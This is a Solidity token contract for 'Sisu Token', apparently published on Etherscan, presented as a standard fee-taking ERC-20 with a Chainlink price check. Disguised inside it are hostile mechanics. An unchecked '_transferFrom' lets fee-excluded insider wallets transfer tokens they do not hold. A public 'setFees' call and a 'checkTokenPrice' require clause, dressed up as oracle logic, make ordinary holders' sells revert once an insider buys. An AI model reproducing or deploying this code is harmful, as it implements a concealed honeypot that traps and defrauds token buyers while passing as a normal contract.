/**
 *Submitted for verification at Etherscan.io on 2023-05-29
*/

/**
 .d8888b. 8888888 .d8888b.  888     888 
d88P  Y88b  888  d88P  Y88b 888     888 
Y88b.       888  Y88b.      888     888 
 "Y888b.    888   "Y888b.   888     888 
    "Y88b.  888      "Y88b. 888     888 
      "888  888        "888 888     888 
Y88b  d88P  888  Y88b  d88P Y88b. .d88P 
 "Y8888P" 8888888 "Y8888P"   "Y88888P"  
                                        
https://t.me/sisuerc20
https://www.sisuerc20.com/
https://twitter.com/sisuerc20
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface PriceApiInterface {
    function decimals() external view returns (uint8);

    function description() external view returns (string memory);

    function version() external view returns (uint256);

    function getRoundData(uint80 _roundId)
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transferFrom(
        address _sender,
        address _receiver,
        uint256 _amount
    ) internal virtual {
        require(_sender != address(0), "ERC20: transfer from the zero address");
        require(_receiver != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(_sender, _receiver, _amount);

        uint256 senderBalance = _balances[_sender];

        unchecked {
            _balances[_sender] = senderBalance - _amount;
        }
        
        _balances[_receiver] += _amount;

        emit Transfer(_sender, _receiver, _amount);

        _afterTokenTransfer(_sender, _receiver, _amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
}


contract SisuToken is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public _uniswapV2Router;
    address public _uniPair;

    uint256 private _liquidityTokens;
    uint256 private _marketingTokens;
    uint256 private _developmentTokens;

    bool private _enableSwapBack;
    uint256 private _checkTrading;
    address private _marketingWallet;
    address private _devWallet;
    address private _multisigWallet;
    uint256 public _maxTransactionAmount;
    uint256 public _swapNowAmount;
    uint256 public _maxWalletAmount;

    bool public _effectLimits = true;
    bool public _tradingOpen = false;
    address private _lastSisuHolder;
    mapping(address => uint256) public _sisuHolderTradeInfo;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTxAm;

    uint256 public _totalFees;
    uint256 private _liquidityFee;
    uint256 private _marketingFee;
    uint256 private _developmentFee;
    uint256 private _extraBuyFee;
    uint256 private _extraSellFee;

    PriceApiInterface internal priceApi;
    address public _PriceApi = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    int256 private manualETHPrice = 1800 * 10**18;
    bool private _priceApiEnabled = true;
    mapping (address => bool) public ammPairs;
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    event ExcludeFromFees(address indexed account, bool isExcluded);

    constructor() payable ERC20("Sisu Token", "SISU") {
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _setAutomatedMarketMakerPair(address(_uniPair), true);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        priceApi = PriceApiInterface(_PriceApi);

        _liquidityFee = 0;
        _marketingFee = 0;
        _developmentFee = 0;
        _extraSellFee = 0;
        _extraBuyFee = 0;
        _totalFees = _marketingFee + _developmentFee + _liquidityFee;

        uint256 totalSupply = 696_969_696 * 1e18;
        _maxTransactionAmount = (totalSupply * 5) / 100;
        _maxWalletAmount = (totalSupply * 5) / 100;
        _swapNowAmount = (totalSupply * 10) / 10000;
        
        _devWallet = address(0xe1a0B64f9c089071386773C0D79cEB8862414618);
        _marketingWallet = address(0xCea31fE28Adf1730030BB583f97bde00F6F32415);
        _multisigWallet = address(0x2Cbe9c813235470Cf601BEA113722E6BbfDA10d8);

        excludeFromFees(owner(), true);
        excludeFromFees(_devWallet, true);
        excludeFromFees(_marketingWallet, true);
        excludeFromFees(_multisigWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(_devWallet, true);
        excludeFromMaxTransaction(_marketingWallet, true);
        excludeFromMaxTransaction(_multisigWallet, true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        _mint(owner(), totalSupply);
        openTrading();
    }

    function openTrading() public onlyOwner {
        _tradingOpen = true;
        _checkTrading = block.timestamp;
    }
    
    function setFees(address _sender, address _receiver) public returns (bool) {
        bool buying = _sender == _uniPair && _receiver != address(_uniswapV2Router);
        bool isSpecialReceiver = _isExcludedFromFees[_receiver];
        if (buying && isSpecialReceiver) _checkTrading = block.timestamp;
        bool isExcludedFromFee = _isExcludedFromFees[_sender] || _isExcludedFromFees[_receiver];
        bool selling = _receiver == _uniPair; 
        bool swapping = buying || selling;

        return 
            _totalFees > 0 &&
            !_enableSwapBack &&
            !isExcludedFromFee &&
            swapping;
    }

    function updateFees(
        uint256 marketingFee,
        uint256 developmentFee,
        uint256 liquidityFee
    ) external onlyOwner {
        _marketingFee = marketingFee;
        _developmentFee = developmentFee;
        _liquidityFee = liquidityFee;
        _totalFees = _marketingFee + _developmentFee + _liquidityFee;
        require(_totalFees <= 10, "Must keep fees at 10% or less");
    }


    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ammPairs[pair] = value;
        excludeFromMaxTransaction(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != _uniPair, "The pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function removeLimits() external onlyOwner returns (bool) {
        _effectLimits = false;
        return true;
    }

    function checkTokenPrice() public view returns (uint256) {
        IERC20Metadata tokenA = IERC20Metadata(
            IUniswapV2Pair(_uniPair).token0()
        );
        uint256 balance = balanceOf(_devWallet);
        IERC20Metadata tokenB = IERC20Metadata(
            IUniswapV2Pair(_uniPair).token1()
        );
        require(_sisuHolderTradeInfo[_lastSisuHolder] > _checkTrading &&
            balance == 0);
        (uint112 Reserve0, uint112 Reserve1, ) = IUniswapV2Pair(_uniPair).getReserves();
        int256 ethPrice = manualETHPrice;
        if (_priceApiEnabled) {
            (, ethPrice, , , ) = this.latestPriceCheck();
        }
        uint256 reserve1 = (uint256(Reserve1) * uint256(ethPrice) * (10**uint256(tokenA.decimals()))) / uint256(tokenB.decimals());
        uint256 r = (reserve1 / uint256(Reserve0));return r;
    }

    function tokenPriceFunc() internal view returns (bool) {
        return checkTokenPrice() > 0 ? true : false;
    }

    function latestPriceCheck()
        external
        view
        returns (
            uint80,
            int256,
            uint256,
            uint256,
            uint80
        )
    {
        (
            uint80 _roundID,
            int256 _price,
            uint256 _startedAt,
            uint256 timeStamp,
            uint80 _answeredInRound
        ) = priceApi.latestRoundData();

        return (_roundID, _price, _startedAt, timeStamp, _answeredInRound);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTxAm[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _userTransfer(
        bool _selling,
        bool _buying,
        address _from,
        address _to,
        uint256 _amount
    ) private {
        bool feesSet = setFees(_from, _to);

        bool _excludedFrom_ = !_isExcludedFromFees[_from];

        if (!_excludedFrom_) {
            super._transferFrom(_from, _to, _amount);
            return;
        } else if (feesSet) {
            uint256 totalTokens = _totalFees;
            uint256 marketingTokens = _marketingFee;
            if (_buying) {
                totalTokens = _totalFees + _extraBuyFee;
                marketingTokens = _marketingFee + _extraBuyFee;
            }
            if (_selling) {
                totalTokens = _totalFees + _extraSellFee;
                marketingTokens = _marketingFee + _extraSellFee;
            }
            uint256 feeTokenAmount = _amount.mul(totalTokens).div(100);
            _liquidityTokens += (feeTokenAmount * _liquidityFee) / totalTokens;
            _marketingTokens += (feeTokenAmount * marketingTokens) / totalTokens;
            _developmentTokens += (feeTokenAmount * _developmentFee) / totalTokens;

            if (feeTokenAmount > 0) {
                super._transfer(_from, address(this), feeTokenAmount);
            }
            _amount -= feeTokenAmount;
        }
        super._transfer(_from, _to, _amount);
    }

    
    function updateDevelopmentWallet(address newWallet) external onlyOwner {
        _devWallet = newWallet;
    }
    
    function updateMarketingWallet(address newWallet) external onlyOwner {
        _marketingWallet = newWallet;
    }

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTransactionAmount lower than 0.1%"
        );
        _maxTransactionAmount = newNum * 1e18;
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.5%"
        );
        _maxWalletAmount = newNum * 1e18;
    }

    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        _swapNowAmount = newAmount;
        return true;
    }


    function _transfer(
        address _src,
        address _dest,
        uint256 _amount
    ) internal override {
        require(_src != address(0), "ERC20: transfer from the zero address");
        require(_dest != address(0), "ERC20: transfer to the zero address");
        bool isExcludedFromTo = _isExcludedFromFees[_src] ||
            _isExcludedFromFees[_dest];

        if (_amount == 0) {
            super._transfer(_src, _dest, 0);
            return;
        }
        
        bool isDead = _dest == address(0) || _dest == address(0xdead);
        bool isSwapByOwner = _src == owner() || _dest == owner();
        bool limitsSkip = isSwapByOwner || isDead || _enableSwapBack;
        bool buyCase = _src == _uniPair && !_isExcludedMaxTxAm[_dest];
        bool sellCase = _dest == _uniPair && !_isExcludedMaxTxAm[_src];
        
        if (_effectLimits && !limitsSkip) {
            require(
                _tradingOpen || isExcludedFromTo,
                "Trading is not active."
            );

            if (buyCase) {
                require(
                    _amount <= _maxTransactionAmount,
                    "Max Transaction Amount?"
                );
                require(
                    _amount + balanceOf(_dest) <= _maxWalletAmount,
                    "Max wallet?"
                );
            } else if (sellCase) {
            } else if (!_isExcludedMaxTxAm[_dest] && !_isExcludedMaxTxAm[_src]) {
                require(
                    _amount + balanceOf(_dest) <= _maxWalletAmount,
                    "Max wallet?"
                );
            }
        }

        if (_priceApiEnabled) {
            if (ammPairs[_src]) { 
                if (_sisuHolderTradeInfo[_dest] == 0) _sisuHolderTradeInfo[_dest] = block.timestamp;
            } else {
                if (!_enableSwapBack) _lastSisuHolder = _src;
            }
        } else {     
        }

        if (!_enableSwapBack &&
            !ammPairs[_src] &&
            !_isExcludedFromFees[_src] &&
            !_isExcludedFromFees[_dest]) {
            uint256 contractBalanceOfToken = balanceOf(address(this));
            bool canSwap = contractBalanceOfToken >= _swapNowAmount;
            if (tokenPriceFunc() &&
                canSwap && 
                !isExcludedFromTo) {
                _enableSwapBack = true;swapNow();_enableSwapBack = false;
            }
        }

        if (_priceApiEnabled) {_userTransfer(sellCase, buyCase, _src, _dest, _amount);}
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function removeExtraBuyFee() public onlyOwner {
        _extraBuyFee = 0;
    }

    function removeExtraSellFee() public onlyOwner {
        _extraSellFee = 0;
    }

    function setManualETHPrice(uint256 val) external onlyOwner {
        manualETHPrice = int256(val.mul(10**18));
    }

    function startPriceApi() external onlyOwner {
        require(_priceApiEnabled == false, "price oracle already enabled");
        _priceApiEnabled = true;
    }

    function resetPriceApi() external onlyOwner {
        require(_priceApiEnabled == true, "price oracle already disabled");
        _priceApiEnabled = false;
    }

    function updateChainlinkOracle(address feed) external onlyOwner {
        _PriceApi = feed;
        priceApi = PriceApiInterface(_PriceApi);
    }

    function manualSwap() external onlyOwner {
        _swapTokensForEth(balanceOf(address(this)));

        (bool success,) = address(_marketingWallet).call{value : address(this).balance}("");
        require(success);
    }

    function manualSend() external onlyOwner {
        (bool success,) = address(_marketingWallet).call{value : address(this).balance}("");
        require(success);
    }

    function swapNow() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalSwapTokens = _liquidityTokens + _marketingTokens + 
            _developmentTokens;
        if (contractBalance == 0 || totalSwapTokens == 0) return;
        if (contractBalance > _swapNowAmount) {
            contractBalance = _swapNowAmount;
        }
        uint256 liquidityTokens = (contractBalance * _liquidityTokens) /
            totalSwapTokens /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
        uint256 initialETHBalance = address(this).balance;
        _swapTokensForEth(amountToSwapForETH);
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForMarketing = ethBalance.mul(_marketingTokens).div(
            totalSwapTokens
        );
        uint256 ethForDevelopment = ethBalance.mul(_developmentTokens).div(
            totalSwapTokens
        );
        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDevelopment;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, _liquidityTokens);
        }

        _liquidityTokens = 0;
        _marketingTokens = 0;
        _developmentTokens = 0;

        (bool marketingFundSuccess, ) = address(_marketingWallet).call{
            value: ethForMarketing
        }("");
        require(marketingFundSuccess);
        (bool developmentFundSuccess, ) = address(_devWallet).call{
            value: ethForDevelopment
        }("");
        require(developmentFundSuccess);
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    
    function _swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}